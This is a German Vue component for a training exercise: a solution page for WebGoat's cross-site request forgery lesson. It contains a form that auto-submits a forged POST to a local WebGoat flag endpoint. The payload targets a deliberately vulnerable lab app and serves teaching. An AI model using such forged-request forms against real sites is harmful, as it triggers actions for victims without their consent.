<template>
  <h1>WebGoat Cross-Site Request Forgeries</h1>
  <p class="question">Aufgabe</p>
  <ol>
    <li>Installieren Sie WebGoat.</li>
    <li>Starten Sie das Docker-Image mit WebGoat.</li>
    <li>Öffnen Sie die Landingpage von WebGoat.</li>
    <li>Lösen Sie zu (A8:2013) Request Forgeries, Cross-Site Request
      Forgeries.</li>
  </ol>
  <p class="question">Lösung</p>
  <div class="container">
    <p>Für diese Aufgabe benutzen wir diese Form: </p>
    <form accept-charset="UNKNOWN" id="basic-csrf-get" method="POST" name="form1" target="_blank" successcallback=""
      action="http://localhost:8080/WebGoat/csrf/basic-get-flag">
      <input name="csrf" value="true">
      <button class="primary" type="submit" name="submit">Senden</button>
    </form>
  </div>
  <br>
  <div class="img-container">
    <img src="./cross-site-request-forgeries.jpeg" alt="Cross-Site Request Forgeries">
  </div>
</template>
  
<script>

</script>

<style lang="scss" scoped>
.container {
  display: flex;
  flex-direction: column;
  flex-wrap: wrap;
}

.img-container {
  width: 600px;
}
</style>